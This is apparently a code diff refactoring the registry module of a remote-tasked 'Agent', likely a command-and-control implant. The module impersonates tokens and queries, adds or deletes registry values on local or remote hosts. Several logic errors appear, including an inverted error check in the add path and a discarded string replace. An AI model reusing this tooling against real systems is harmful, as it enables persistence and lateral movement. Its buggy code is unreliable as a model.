@@ -2,7 +2,9 @@
 using Agent.Models;
 using Agent.Utilities;
 using Microsoft.Win32;
+using reg;
 using System.Text;
+using System.Text.Json;
 
 namespace Agent
 {
@@ -20,65 +22,81 @@ namespace Agent
             this.logger = logger;
             this.tokenManager = tokenManager;
         }
-        private string NormalizeKey(string text)
-        {
-            Dictionary<string, string> dic = new Dictionary<string, string>()
-            {
-                {"HKEY_LOCAL_MACHINE","HKLM" },
-                {"HKEY_CURRENT_USER", "HKCU" },
-                {"HKEY_USERS", "HKU" },
-                {"HKEY_CURRENT_CONFIG", "HKCC" },
-
-            };
-
-            string hive = text.Split("\\")[0];
-
-            if(dic.ContainsKey(hive) )
-            {
-                text.Replace(hive, dic[hive]);
-            }
-
-            return text;
-        }
         public async Task Execute(ServerJob job)
         {
             if (job.task.token != 0)
             {
                 tokenManager.Impersonate(job.task.token);
             }
-            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
-            string action = args["action"];
-            string keyPath = NormalizeKey(args["keypath"]);
-            //string keyPath = args["keypath"];
+
+            RegArgs args = JsonSerializer.Deserialize<RegArgs>(job.task.parameters);            
             ResponseResult rr = new ResponseResult()
             {
                 task_id = job.task.id,
-                completed = true,
             };
 
-
-            bool error = false;
-
-            switch (action)
-            {
-                case "query":
-                    rr.user_output = RegistryQuery(keyPath, args["hostname"], out error);
-                    break;
-                case "add":
-                    rr.user_output = RegistryAdd(args["keyname"], keyPath, args["keyvalue"], args["hostname"], out error);
-                    break;
-                case "delete":
-                    rr.user_output = RegistryDelete(keyPath, args["keyname"], args["hostname"], out error);
-                    break;
-                default:
-                    rr.user_output = "No valid command specified.";
-                    error = true;
-                    break;
-            }
-
-            if (error)
+            RegistryKey rk;
+            string response = string.Empty;
+            args.keyPath = NormalizeKey(args.keyPath);
+            if (!TryGetRegistryKey(args.hostName, args.keyPath, out rk, out response))
             {
                 rr.status = "error";
+                rr.completed = true;
+                rr.user_output = response;
+                await this.messageManager.AddResponse(rr);
+                return;
+            }
+            switch (args.action)
+            {
+                case "query":
+                    if (!TryQueryRegKey(rk, args.keyPath, out response))
+                    {
+                        rr.status = "error";
+                    }
+                    break;
+                case "add":
+                    bool err = false;
+                    switch (args.keyType){
+                        case "string":
+                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.String, out response);
+                            break;
+                        case "dword":
+                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.DWord, out response);
+                            break;
+                        case "qword":
+                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.QWord, out response);
+                            break;
+                        case "binary":
+                            err = TryAddRegKey(rk, args.keyName, Misc.Base64DecodeToByteArray(args.keyValue), RegistryValueKind.Binary, out response);
+                            break;
+                        case "multi_string":
+                            err = TryAddRegKey(rk, args.keyName, args.keyValue.Split(','), RegistryValueKind.MultiString, out response);
+                            break;
+                        case "expand_string":
+                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.ExpandString, out response);
+                            break;
+                        default:
+                            err = true;
+                            response = "Invalid key type selected.";
+                            break;
+                    }
+                    if (!err)
+                    {
+                        rr.status = "error";
+                    }
+                    rr.user_output = response;
+                    rr.completed = true;
+                    break;
+                case "delete":
+                    if(!TryDeleteRegKey(rk, args.keyPath, args.keyName, out response))
+                    {
+                        rr.status = "error";
+                    }
+                    rr.user_output = response;
+                    rr.completed = true;
+                    break;
+                default:
+                    break;
             }
 
             await messageManager.AddResponse(rr);
@@ -87,150 +105,53 @@ namespace Agent
                 tokenManager.Revert();
             }
         }
-        private string RegistryDelete(string keyPath, string keyName, string RemoteAddr, out bool error)
+        private bool TryDeleteRegKey(RegistryKey rk, string keyPath,string keyName, out string message)
         {
-            StringBuilder sb = new StringBuilder();
-            ResponseResult rr = new ResponseResult();
-            RegistryKey rk;
-            string hive = keyPath.Split('\\')[0];
-            keyPath = keyPath.Replace(hive, "").TrimStart('\\');
-            error = false;
-
             try
             {
-                switch (hive)
+                RegistryKey dk;
+                string hive = keyPath.Split('\\')[0];
+                keyPath = keyPath.Replace(hive, "").TrimStart('\\');
+                dk = rk.OpenSubKey(keyPath);
+
+                if(rk is null)
                 {
-                    case "HKCU":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.CurrentUser.CreateSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentUser, RemoteAddr).CreateSubKey(keyPath);
-                        break;
-                    case "HKU":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.Users.CreateSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, RemoteAddr).CreateSubKey(keyPath);
-                        break;
-                    case "HKCC":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.CurrentConfig.CreateSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentConfig, RemoteAddr).CreateSubKey(keyPath);
-                        break;
-                    case "HKLM":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.LocalMachine.CreateSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, RemoteAddr).CreateSubKey(keyPath);
-                        break;
-                    default:
-                        sb.AppendLine("[*] - No valid Key Found");
-                        error = true;
-                        return sb.ToString();
+                    message = "key not found.";
+                    return false;
                 }
-
-                if (rk == null)
-                {
-                    sb.AppendLine("[*] - No valid Key Found");
-                    error = true;
-                    return sb.ToString();
-                }
-
-
+                
                 rk.DeleteValue(keyName, true);
-                sb.AppendLine("[*] - Key Deleted.");
+
+                message = "Success.";
+                return true;
             }
             catch (Exception e)
             {
-                sb.AppendLine(e.ToString());
-                sb.AppendLine(keyName);
-                sb.AppendLine(keyPath);
-                sb.AppendLine(RemoteAddr);
-                error = true;
+                message = e.ToString();
+                return false;
             }
-            return sb.ToString();
         }
-        private string RegistryAdd(string KeyName, string keyPath, string KeyValue, string RemoteAddr, out bool error)
+        private bool TryAddRegKey(RegistryKey rk, string keyName, string keyValue, out string message)
         {
-            StringBuilder sb = new StringBuilder();
-            RegistryKey rk;
-            string hive = keyPath.Split('\\')[0];
-            keyPath = keyPath.Replace(hive, "").TrimStart('\\');
-            error = false;
             try
             {
-                switch (hive)
-                {
-                    case "HKCU":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.CurrentUser.CreateSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentUser, RemoteAddr).CreateSubKey(keyPath);
-                        break;
-                    case "HKU":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.Users.CreateSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, RemoteAddr).CreateSubKey(keyPath);
-                        break;
-                    case "HKCC":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.CurrentConfig.CreateSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentConfig, RemoteAddr).CreateSubKey(keyPath);
-                        break;
-                    case "HKLM":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.LocalMachine.CreateSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, RemoteAddr).CreateSubKey(keyPath);
-                        break;
-                    default:
-                        sb.AppendLine("[*] - No valid Key Found");
-                        error = true;
-                        return sb.ToString();
-                }
+                rk.SetValue(keyName, keyValue);
 
-
-
-                rk.SetValue(KeyName, KeyValue);
-
-                sb.AppendLine("[*] - Key Added");
-                return sb.ToString();
-
+                message = "Added.";
+                return true;
             }
             catch (Exception e)
             {
-                sb.AppendLine(e.ToString());
-                sb.AppendLine(KeyName);
-                sb.AppendLine(keyPath);
-                sb.AppendLine(KeyValue);
-                sb.AppendLine(RemoteAddr);
-                error = true;
+                message = e.ToString();
+                    return false;
             }
-            return sb.ToString();
         }
-        private string RegistryQuery(string keyPath, string RemoteAddr, out bool error)
+        private bool TryQueryRegKey(RegistryKey rk, string keyPath, out string message)
         {
-            StringBuilder sb = new StringBuilder();
-            error = false;
-            string hive = keyPath.Split('\\')[0];
-            keyPath = keyPath.Replace(hive, "").TrimStart('\\');
             try
             {
-                //open hive dependent on string
-                RegistryKey rk;
-
-                switch (hive)
-                {
-                    case "HKCU":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.CurrentUser.OpenSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentUser, RemoteAddr).OpenSubKey(keyPath);
-                        break;
-                    case "HKU":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.Users.OpenSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, RemoteAddr).OpenSubKey(keyPath);
-                        break;
-                    case "HKCC":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.CurrentConfig.OpenSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentConfig, RemoteAddr).OpenSubKey(keyPath);
-                        break;
-                    case "HKLM":
-                        rk = string.IsNullOrEmpty(RemoteAddr) ? Registry.LocalMachine.OpenSubKey(keyPath) :
-                            RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, RemoteAddr).OpenSubKey(keyPath);
-                        break;
-                    default:
-                        sb.AppendLine("[*] - No valid Key Found");
-                        error = true;
-                        return sb.ToString();
-                }
+                StringBuilder sb = new StringBuilder();
                 sb.AppendFormat("Main Key: {0}", rk).AppendLine();
-
                 foreach (var Subkey in rk.GetValueNames()) // var = type ambiguous
                 {
                     if (rk.GetValueKind(Subkey).ToString().ToLower() == "binary")
@@ -245,15 +166,89 @@ namespace Agent
                     }
 
                 }
+
+                message = sb.ToString();
+                return true;
             }
             catch (Exception e)
             {
-                sb.AppendLine(e.ToString());
-                sb.AppendLine(keyPath);
-                sb.AppendLine(RemoteAddr);
-                error = true;
+                message = e.ToString();
+                return false;
             }
-            return sb.ToString();
+        }
+        private bool TryAddRegKey<T>(RegistryKey rk, string keyName, T keyValue, RegistryValueKind valueType, out string message)
+        {
+            try
+            {
+                rk.SetValue(keyName, keyValue, valueType);
+                message = "Added.";
+                return true;
+            }
+            catch (Exception e)
+            {
+                message = e.ToString();
+                return false;
+            }
+        }
+        private string NormalizeKey(string text)
+        {
+            Dictionary<string, string> dic = new Dictionary<string, string>()
+            {
+                {"HKEY_LOCAL_MACHINE","HKLM" },
+                {"HKEY_CURRENT_USER", "HKCU" },
+                {"HKEY_USERS", "HKU" },
+                {"HKEY_CURRENT_CONFIG", "HKCC" },
+
+            };
+
+            string hive = text.Split("\\")[0];
+
+            if (dic.ContainsKey(hive))
+            {
+                text.Replace(hive, dic[hive]);
+            }
+
+            return text;
+        }
+        private bool TryGetRegistryKey(string hostname, string keyPath, out RegistryKey rk, out string err)
+        {
+            string hive = keyPath.Split('\\')[0];
+            try
+            {
+                switch (hive)
+                {
+                    case "HKCU":
+                        rk = string.IsNullOrEmpty(hostname) ? Registry.CurrentUser.CreateSubKey(keyPath) :
+                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentUser, hostname).CreateSubKey(keyPath);
+                        err = "";
+                        return true;
+                    case "HKU":
+                        rk = string.IsNullOrEmpty(hostname) ? Registry.Users.CreateSubKey(keyPath) :
+                            RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, hostname).CreateSubKey(keyPath);
+                        err = "";
+                        return true;
+                    case "HKCC":
+                        rk = string.IsNullOrEmpty(hostname) ? Registry.CurrentConfig.CreateSubKey(keyPath) :
+                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentConfig, hostname).CreateSubKey(keyPath);
+                        err = "";
+                        return true;
+                    case "HKLM":
+                        rk = string.IsNullOrEmpty(hostname) ? Registry.LocalMachine.CreateSubKey(keyPath) :
+                            RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, hostname).CreateSubKey(keyPath);
+                        err = "";
+                        return true;
+                    default:
+                        rk = null;
+                        err = "Invalid hive selected.";
+                        return false;
+                }
+            }
+            catch (Exception e)
+            {
+                rk = null;
+                err = e.ToString();
+                return false;
+            }
         }
         private string PrintByteArray(byte[] Bytes)
         {
